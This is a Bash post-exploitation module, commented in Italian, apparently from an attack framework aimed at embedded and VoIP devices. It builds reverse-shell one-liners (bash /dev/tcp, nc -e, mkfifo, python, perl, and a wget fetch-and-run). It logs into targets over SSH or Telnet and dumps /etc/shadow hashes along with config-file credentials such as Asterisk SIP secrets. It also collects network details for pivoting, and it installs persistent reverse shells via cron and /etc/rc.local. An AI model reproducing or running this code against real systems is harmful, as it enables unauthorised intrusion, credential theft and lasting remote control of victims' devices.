# ── Helper: genera payload reverse shell per ambienti embedded ─
_revshell_payload() {
    local lhost="$1" lport="$2" ptype="${3:-auto}"
    case "$ptype" in
        bash)
            printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$lhost" "$lport"
            ;;
        busybox)
            printf 'busybox nc %s %s -e /bin/sh' "$lhost" "$lport"
            ;;
        mkfifo)
            printf 'rm -f /tmp/.p;mkfifo /tmp/.p;cat /tmp/.p|/bin/sh -i 2>&1|nc %s %s>/tmp/.p' \
                "$lhost" "$lport"
            ;;
        python)
            printf 'python3 -c '"'"'import socket,subprocess,os;s=socket.socket();s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"'' \
                "$lhost" "$lport"
            ;;
        perl)
            printf 'perl -e '"'"'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'"'"'' \
                "$lhost" "$lport"
            ;;
        wget)
            printf 'wget -q http://%s:%s/shell.sh -O /tmp/.s && chmod +x /tmp/.s && /tmp/.s' \
                "$lhost" "$lport"
            ;;
        nc)
            printf 'nc %s %s -e /bin/sh' "$lhost" "$lport"
            ;;
        auto|*)
            # Prova in ordine: mkfifo (più compatibile con busybox), bash, busybox, nc
            printf 'rm -f /tmp/.p;mkfifo /tmp/.p;cat /tmp/.p|/bin/sh -i 2>&1|nc %s %s>/tmp/.p' \
                "$lhost" "$lport"
            ;;
    esac
}

# ── Helper: avvia listener nc in finestra tmux ─────────────────
_start_listener() {
    local lport="$1" session_name="post_listener_${lport}"
    if [[ ${DRY_RUN:-0} -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} nc -lvnp $lport  (listener)"
        return
    fi
    if command -v tmux &>/dev/null; then
        tmux new-window -t "${_ACTIVE_TMUX_SESSION:-main}" -n "listener_${lport}" 2>/dev/null || \
            tmux new-session -d -s "$session_name" 2>/dev/null || true
        tmux send-keys -t "${_ACTIVE_TMUX_SESSION:-$session_name}:listener_${lport}" \
            "echo '[LISTENER] In attesa su 0.0.0.0:$lport...'; nc -lvnp $lport" Enter 2>/dev/null || true
        warn "Listener avviato in tmux (porta $lport). Connettiti con: tmux attach -t ${_ACTIVE_TMUX_SESSION:-$session_name}"
    else
        warn "Avvia manualmente: nc -lvnp $lport"
    fi
}

# ── Helper: esegui comandi su SSH ──────────────────────────────
_ssh_exec() {
    local user="$1" pass="$2" target="$3" port="$4" cmd="$5"
    if tool_ok sshpass; then
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=8 -o BatchMode=no \
            -p "$port" "${user}@${target}" "$cmd" 2>/dev/null
    else
        # Fallback: ssh con askpass disabilitato (solo key-based)
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 \
            -o PasswordAuthentication=no \
            -p "$port" "${user}@${target}" "$cmd" 2>/dev/null
    fi
}

# ── Helper: esegui comando su Telnet via expect ────────────────
_telnet_exec() {
    local user="$1" pass="$2" target="$3" port="$4" cmd="$5" outfile="$6"
    if ! tool_ok expect; then
        warn "expect non trovato — Telnet automation non disponibile (apt install expect)"
        return 1
    fi
    expect -c "
        log_user 0
        set timeout 10
        spawn nc $target $port
        expect {
            \"login:\"    { send \"$user\r\" }
            \"Username:\"  { send \"$user\r\" }
            timeout        { exit 1 }
        }
        expect {
            \"Password:\"  { send \"$pass\r\" }
            \"assword\"    { send \"$pass\r\" }
            timeout         { exit 1 }
        }
        expect {
            \">>\$\" { send \"$cmd\r\" }
            \"\\$ \"  { send \"$cmd\r\" }
            \"# \"   { send \"$cmd\r\" }
            timeout  { exit 1 }
        }
        expect {
            \">>\$\" { send \"exit\r\" }
            \"\\$ \"  { send \"exit\r\" }
            \"# \"   { send \"exit\r\" }
            timeout  {}
        }
        expect eof
    " 2>/dev/null | tee -a "$outfile" || true
}

# ── Helper: test web command injection su un path/parametro ───
_web_inject_test() {
    local url="$1" param="$2" insecure="$3" user="$4" pass="$5"
    local auth=""
    [[ -n "$user" && -n "$pass" ]] && auth="--user ${user}:${pass}"
    local test_cmd=";id"
    local encoded; encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${test_cmd}'))" 2>/dev/null || \
                             printf '%s' "$test_cmd" | od -A n -t x1 | tr -d ' \n' | sed 's/../%&/g')
    local resp
    resp=$(curl -sk $insecure $auth --max-time 8 \
           "${url}?${param}=127.0.0.1${encoded}" 2>/dev/null || true)
    if echo "$resp" | grep -qE "uid=[0-9]+|root:|nobody:|www-data"; then
        echo "INJECTABLE"
    else
        # Prova POST
        resp=$(curl -sk $insecure $auth --max-time 8 -X POST \
               -d "${param}=127.0.0.1${test_cmd}" "$url" 2>/dev/null || true)
        if echo "$resp" | grep -qE "uid=[0-9]+|root:|nobody:|www-data"; then
            echo "INJECTABLE_POST"
        else
            echo "CLEAN"
        fi
    fi
}

# ── Sub-metodo: post shell ─────────────────────────────────────
_post_shell() {
    local target="$1" user="$2" pass="$3" port="$4" proto="$5"
    local persist="$6" lhost="$7" lport="$8" payload_type="$9"

    section "Rilevamento protocollo"
    if [[ "$proto" == "auto" ]]; then
        if check_port "$target" "${port:-22}"; then
            proto="ssh"; port="${port:-22}"
        elif check_port "$target" 23; then
            proto="telnet"; port=23
        elif check_port "$target" 2002; then
            proto="telnet"; port=2002
        else
            err "Nessuna porta SSH/Telnet raggiungibile su $target"; return 1
        fi
        log "Protocollo rilevato: $proto:$port"
    fi

    local exec_fn
    if [[ "$proto" == "ssh" ]]; then
        exec_fn() { _ssh_exec "$user" "$pass" "$target" "$port" "$1"; }
    else
        exec_fn() { _telnet_exec "$user" "$pass" "$target" "$port" "$1" "$OUTDIR/telnet_out.txt"; }
    fi

    section "System Info"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        local cmds=(
            "uname -a"
            "cat /proc/version 2>/dev/null || true"
            "id"
            "hostname"
            "uptime"
        )
        for cmd in "${cmds[@]}"; do
            local out; out=$(exec_fn "$cmd" 2>/dev/null || true)
            [[ -n "$out" ]] && echo "$cmd >>> $out" | tee -a "$OUTDIR/sysinfo.txt"
        done
        [[ -f "$OUTDIR/sysinfo.txt" ]] && found INFO "POST:shell — system info raccolto"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} SSH/Telnet system info: uname -a, id, hostname, uptime"
    fi

    section "Utenti e Hash Password"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        for cmd in "cat /etc/passwd" "cat /etc/shadow 2>/dev/null" "cat /etc/group"; do
            local out; out=$(exec_fn "$cmd" 2>/dev/null || true)
            if [[ -n "$out" ]]; then
                local fname; fname=$(echo "$cmd" | awk '{print $NF}' | tr '/' '_')
                echo "$out" > "$OUTDIR/post_${fname}.txt"
                if echo "$out" | grep -q "root:"; then
                    found HIGH "POST:shell — $cmd accessibile"
                fi
                # Cerca hash crackabili
                if echo "$cmd" | grep -q "shadow"; then
                    local hashes; hashes=$(echo "$out" | grep -v "^[^:]*:[!*]:" | grep -v "^$" || true)
                    if [[ -n "$hashes" ]]; then
                        found CRITICAL "POST:shell — /etc/shadow leggibile con hash cracabili"
                        echo "$hashes" > "$OUTDIR/post_shadow_hashes.txt"
                    fi
                fi
            fi
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} /etc/passwd, /etc/shadow, /etc/group"
    fi

    section "Rete e Pivot"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        for cmd in \
            "ifconfig 2>/dev/null || ip addr 2>/dev/null" \
            "route -n 2>/dev/null || ip route 2>/dev/null" \
            "netstat -an 2>/dev/null || ss -an 2>/dev/null" \
            "cat /proc/net/arp 2>/dev/null" \
            "cat /proc/net/fib_trie 2>/dev/null | grep -A1 LOCAL | grep -v LOCAL | head -20" \
        ; do
            local out; out=$(exec_fn "$cmd" 2>/dev/null || true)
            [[ -n "$out" ]] && echo "$out" >> "$OUTDIR/post_network.txt"
        done
        [[ -f "$OUTDIR/post_network.txt" ]] && \
            found INFO "POST:shell — network info raccolto (vedi post_network.txt)"
        # Estrai IP interni da ARP e route per pivot
        grep -oP '(\d{1,3}\.){3}\d{1,3}' "$OUTDIR/post_network.txt" 2>/dev/null | \
            grep -vE "^(127\.|0\.0\.0|255\.)" | sort -u > "$OUTDIR/post_pivot_hosts.txt" || true
        local n_hosts; n_hosts=$(wc -l < "$OUTDIR/post_pivot_hosts.txt" 2>/dev/null || echo 0)
        [[ $n_hosts -gt 1 ]] && found MEDIUM "POST:shell — $n_hosts host interni per pivot (post_pivot_hosts.txt)"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} ifconfig/ip addr, route, netstat, /proc/net/arp"
    fi

    section "Processi e Servizi"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        local ps_out; ps_out=$(exec_fn "ps aux 2>/dev/null || ps 2>/dev/null" 2>/dev/null || true)
        [[ -n "$ps_out" ]] && echo "$ps_out" > "$OUTDIR/post_processes.txt"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} ps aux"
    fi

    section "Credenziali da File di Config"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        # Percorsi tipici su device embedded/VoIP
        local config_paths=(
            "/etc/asterisk/sip.conf"
            "/etc/asterisk/extensions.conf"
            "/etc/asterisk/manager.conf"
            "/etc/freeswitch/sip_profiles/*.xml"
            "/etc/voip/*.cfg"
            "/etc/sip/*.cfg"
            "/var/voip/*.cfg"
            "/mnt/flash/*.cfg"
            "/tmp/*.cfg"
            "/etc/passwd"
            "/etc/config/system"
            "/etc/config/network"
            "/etc/config/wireless"
            "/usr/local/etc/asterisk/sip.conf"
        )
        local cred_cmd="grep -rl 'password\\|passwd\\|secret\\|pin' /etc /var/voip /mnt 2>/dev/null | head -20"
        local cred_files; cred_files=$(exec_fn "$cred_cmd" 2>/dev/null || true)
        if [[ -n "$cred_files" ]]; then
            echo "$cred_files" > "$OUTDIR/post_config_files.txt"
            found HIGH "POST:shell — file config con credenziali trovati"
            while IFS= read -r f; do
                [[ -z "$f" ]] && continue
                local content; content=$(exec_fn "cat '$f' 2>/dev/null" 2>/dev/null || true)
                [[ -n "$content" ]] && {
                    local safe_name; safe_name=$(echo "$f" | tr '/' '_')
                    echo "$content" > "$OUTDIR/post_cfg_${safe_name}.txt"
                    # Estrai credenziali
                    grep -iE 'password|secret|passwd|pin' "$OUTDIR/post_cfg_${safe_name}.txt" 2>/dev/null | \
                        while IFS= read -r l; do found CRITICAL "POST:shell — cred in $f: $l"; done || true
                }
            done <<< "$cred_files" || true
        fi
        # Cerca anche directory con file di config
        local find_cmd; find_cmd="find /etc /var /mnt /tmp -maxdepth 4 -name '*.cfg' -o -name '*.conf' -o -name '*.ini' 2>/dev/null | head -30"
        exec_fn "$find_cmd" 2>/dev/null > "$OUTDIR/post_all_configs.txt" || true
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Ricerca credenziali in file config"
    fi

    section "Filesystem Sensibile"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        local fs_cmds=(
            "df -h 2>/dev/null"
            "ls -la / 2>/dev/null"
            "ls -la /etc/ 2>/dev/null"
            "find /tmp /var/tmp -maxdepth 2 -ls 2>/dev/null | head -20"
            "find / -maxdepth 4 -perm -4000 2>/dev/null | head -20"
        )
        for cmd in "${fs_cmds[@]}"; do
            local out; out=$(exec_fn "$cmd" 2>/dev/null || true)
            [[ -n "$out" ]] && echo "=== $cmd ===" >> "$OUTDIR/post_filesystem.txt"
            [[ -n "$out" ]] && echo "$out" >> "$OUTDIR/post_filesystem.txt"
        done
        # SUID binaries check
        if grep -q "perm -4000" "$OUTDIR/post_filesystem.txt" 2>/dev/null; then
            found HIGH "POST:shell — binari SUID trovati (privilege escalation potenziale)"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} df, ls, find SUID"
    fi

    if [[ -n "$lhost" ]]; then
        section "Reverse Shell"
        local rs_payload; rs_payload=$(_revshell_payload "$lhost" "$lport" "$payload_type")
        log "Payload ($payload_type): $rs_payload"
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            _start_listener "$lport"
            sleep 1
            exec_fn "$rs_payload" 2>/dev/null || true
            found CRITICAL "POST:shell — reverse shell inviata verso $lhost:$lport"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Reverse shell payload: $rs_payload"
            echo -e "${CYAN}[DRY-RUN]${NC} Listener: nc -lvnp $lport"
        fi
    fi

    if [[ "$persist" == "1" ]]; then
        section "Persistenza"
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            local cron_cmd="(crontab -l 2>/dev/null; echo '*/5 * * * * $(_revshell_payload "${lhost:-127.0.0.1}" "${lport:-4444}" "mkfifo")') | crontab -"
            exec_fn "$cron_cmd" 2>/dev/null && \
                found CRITICAL "POST:shell — cron persistenza installata (ogni 5 min)" || \
                warn "Cron non disponibile"
            # Prova rc.local
            local rc_cmd="echo '$(_revshell_payload "${lhost:-127.0.0.1}" "${lport:-4444}" "mkfifo") &' >> /etc/rc.local 2>/dev/null"
            exec_fn "$rc_cmd" 2>/dev/null && \
                found CRITICAL "POST:shell — persistenza via /etc/rc.local" || true
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Persistenza: cron + /etc/rc.local"
        fi
    fi
}

